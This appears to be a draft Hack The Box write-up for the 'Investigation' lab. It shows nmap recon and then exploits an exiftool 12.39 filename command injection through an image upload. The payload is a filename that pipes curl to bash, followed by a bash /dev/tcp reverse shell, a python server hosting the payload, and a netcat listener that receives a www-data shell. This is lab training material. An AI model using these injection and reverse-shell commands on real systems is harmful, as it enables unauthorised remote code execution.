---
title: "Hackthebox Investigation"
date: 2023-01-25T14:44:57+01:00
draft: true
---

On Investigation we exploit an exiftool vulnerability from file upload that allow command execution and to gain a reverse shell.
Next we get credentials for one user from a mail text message. Finally, for root we have to do a little bit
of binary exploitation using ghidra.
<!--more-->

## Nmap

As usual we start we some recon :

```
nmap 10.129.139.235
Nmap scan report for 10.129.139.235
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

## HTTP:80

![image text](/investigation_htb_web.png)

Jumping on the website we see a free service which allow us to upload image file (png/jpg) :

![image text](/investigation_htb_upload.png)

The output allows us to view exiftool's version number.

![image text](/investigation_htb_exif.png)

The version is 12.39 and it seems that it's vulnerable to command injection through a crafted filename. 
If the filename passed to exiftool ends with a pipe character `|` and exists on the filesystem,
then the file will be treated as a pipe and executed as an OS command.

The proof of concept can be found **[here](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)**.
Now all we have to do is to rename our image file with one linux command add the pipe at the end : 

```
mv image.png 'curl IP | bash |'
```
Next we need to create and index.html file, put a bash reverse shell in it and host our file using python :

```
cat index.html
bash -i >& /dev/tcp/IP/6666 0>&1
```
```
python3 -m http.server 80
```

Setup a netcat listener and let's go :

```bash
nc -lnvp 6666
Listening on 0.0.0.0 6666
Connection received on 10.129.139.235
www-data@investigation:~/uploads/1674415004$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

